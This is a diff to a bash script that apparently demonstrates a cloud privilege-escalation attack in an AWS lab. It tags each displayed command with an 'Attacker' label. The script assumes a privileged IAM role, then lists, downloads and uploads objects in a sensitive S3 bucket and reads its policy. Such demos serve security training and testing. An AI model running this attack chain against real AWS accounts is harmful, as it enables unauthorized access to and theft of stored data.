@@ -24,12 +24,14 @@ ATTACK_COMMANDS=()
 
 # Display a command before executing it
 show_cmd() {
-    echo -e "${DIM}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "${DIM}[${identity}] \$ $*${NC}"
 }
 
 # Display AND record an attack command
 show_attack_cmd() {
-    echo -e "\n${CYAN}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
     ATTACK_COMMANDS+=("$*")
 }
 
@@ -76,7 +78,7 @@ export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
 export AWS_DEFAULT_REGION="us-west-2"
 
 echo -e "${YELLOW}Step 1: Verifying current identity${NC}"
-show_cmd "aws sts get-caller-identity --output json"
+show_cmd "Attacker" "aws sts get-caller-identity --output json"
 CURRENT_IDENTITY=$(aws sts get-caller-identity --output json)
 echo "Current identity:"
 echo "$CURRENT_IDENTITY" | jq '.'
@@ -99,7 +101,7 @@ echo "Testing what we can access with current permissions..."
 
 # Test S3 access with current permissions
 echo "Attempting to list all S3 buckets..."
-show_cmd "aws s3api list-buckets --output json"
+show_cmd "Attacker" "aws s3api list-buckets --output json"
 if BUCKETS=$(aws s3api list-buckets --output json 2>/dev/null); then
     echo -e "${GREEN}✓ Can list S3 buckets${NC}"
     echo "Available buckets:"
@@ -115,7 +117,7 @@ echo ""
 echo -e "${YELLOW}Step 3: Assuming the exclusive bucket access role${NC}"
 echo "Attempting to assume role: $EXCLUSIVE_BUCKET_ACCESS_ROLE_ARN"
 
-show_attack_cmd "aws sts assume-role --role-arn \"$EXCLUSIVE_BUCKET_ACCESS_ROLE_ARN\" --role-session-name \"exclusive-bucket-access-session\" --output json"
+show_attack_cmd "Attacker" "aws sts assume-role --role-arn \"$EXCLUSIVE_BUCKET_ACCESS_ROLE_ARN\" --role-session-name \"exclusive-bucket-access-session\" --output json"
 if EXCLUSIVE_BUCKET_ACCESS_CREDENTIALS=$(aws sts assume-role --role-arn "$EXCLUSIVE_BUCKET_ACCESS_ROLE_ARN" --role-session-name "exclusive-bucket-access-session" --output json 2>&1); then
     echo -e "${GREEN}✓ Successfully assumed exclusive bucket access role!${NC}"
     echo ""
@@ -135,7 +137,7 @@ if EXCLUSIVE_BUCKET_ACCESS_CREDENTIALS=$(aws sts assume-role --role-arn "$EXCLUS
 
     # Test S3 access with assumed role
     echo "Attempting to list all S3 buckets with assumed role..."
-    show_cmd "aws s3api list-buckets --output json"
+    show_cmd "Attacker" "aws s3api list-buckets --output json"
     if ASSUMED_BUCKETS=$(aws s3api list-buckets --output json 2>/dev/null); then
         echo -e "${GREEN}✓ Can list S3 buckets with assumed role${NC}"
         echo "Available buckets:"
@@ -149,7 +151,7 @@ if EXCLUSIVE_BUCKET_ACCESS_CREDENTIALS=$(aws sts assume-role --role-arn "$EXCLUS
     # Try to access a specific bucket (this should fail due to IAM restrictions)
     echo ""
     echo "Attempting to access a specific bucket (should fail due to IAM restrictions)..."
-    show_cmd "aws s3 ls s3://some-bucket-that-doesnt-exist/"
+    show_cmd "Attacker" "aws s3 ls s3://some-bucket-that-doesnt-exist/"
     if aws s3 ls s3://some-bucket-that-doesnt-exist/ 2>/dev/null; then
         echo -e "${GREEN}✓ Can access specific bucket (unexpected)${NC}"
     else
@@ -169,7 +171,7 @@ if EXCLUSIVE_BUCKET_ACCESS_CREDENTIALS=$(aws sts assume-role --role-arn "$EXCLUS
 
         # List objects in the exclusive sensitive bucket
         echo "Listing objects in exclusive sensitive bucket..."
-        show_attack_cmd "aws s3 ls \"s3://$EXCLUSIVE_SENSITIVE_BUCKET/\" --output json"
+        show_attack_cmd "Attacker" "aws s3 ls \"s3://$EXCLUSIVE_SENSITIVE_BUCKET/\" --output json"
         if EXCLUSIVE_SENSITIVE_OBJECTS=$(aws s3 ls "s3://$EXCLUSIVE_SENSITIVE_BUCKET/" --output json 2>/dev/null); then
             echo -e "${GREEN}✓ Successfully listed objects in exclusive sensitive bucket!${NC}"
             echo "Objects found:"
@@ -188,7 +190,7 @@ if EXCLUSIVE_BUCKET_ACCESS_CREDENTIALS=$(aws sts assume-role --role-arn "$EXCLUS
             # Download each sensitive file
             echo "$EXCLUSIVE_SENSITIVE_OBJECTS" | jq -r '.[] | .Key' | while read -r object; do
                 echo "Downloading: $object"
-                show_attack_cmd "aws s3 cp \"s3://$EXCLUSIVE_SENSITIVE_BUCKET/$object\" \"$TEMP_DIR/$object\""
+                show_attack_cmd "Attacker" "aws s3 cp \"s3://$EXCLUSIVE_SENSITIVE_BUCKET/$object\" \"$TEMP_DIR/$object\""
                 if aws s3 cp "s3://$EXCLUSIVE_SENSITIVE_BUCKET/$object" "$TEMP_DIR/$object" 2>/dev/null; then
                     echo -e "${GREEN}✓ Successfully downloaded: $object${NC}"
                     echo "Content preview:"
@@ -209,7 +211,7 @@ if EXCLUSIVE_BUCKET_ACCESS_CREDENTIALS=$(aws sts assume-role --role-arn "$EXCLUS
             TEST_FILE="/tmp/exclusive-test-upload-$(date +%s).txt"
             echo "This is a test file uploaded by the exclusive role - should be the only one who can access this" > "$TEST_FILE"
 
-            show_attack_cmd "aws s3 cp \"$TEST_FILE\" \"s3://$EXCLUSIVE_SENSITIVE_BUCKET/exclusive-test-upload.txt\""
+            show_attack_cmd "Attacker" "aws s3 cp \"$TEST_FILE\" \"s3://$EXCLUSIVE_SENSITIVE_BUCKET/exclusive-test-upload.txt\""
             if aws s3 cp "$TEST_FILE" "s3://$EXCLUSIVE_SENSITIVE_BUCKET/exclusive-test-upload.txt" 2>/dev/null; then
                 echo -e "${GREEN}✓ Successfully uploaded test file to exclusive sensitive bucket!${NC}"
 
@@ -238,7 +240,7 @@ if EXCLUSIVE_BUCKET_ACCESS_CREDENTIALS=$(aws sts assume-role --role-arn "$EXCLUS
             echo "Let's verify this by checking the bucket policy..."
 
             # Get the bucket policy
-            show_cmd "aws s3api get-bucket-policy --bucket \"$EXCLUSIVE_SENSITIVE_BUCKET\" --output json"
+            show_cmd "Attacker" "aws s3api get-bucket-policy --bucket \"$EXCLUSIVE_SENSITIVE_BUCKET\" --output json"
             if BUCKET_POLICY=$(aws s3api get-bucket-policy --bucket "$EXCLUSIVE_SENSITIVE_BUCKET" --output json 2>/dev/null); then
                 echo -e "${GREEN}✓ Retrieved bucket policy${NC}"
                 echo "Bucket policy contains:"
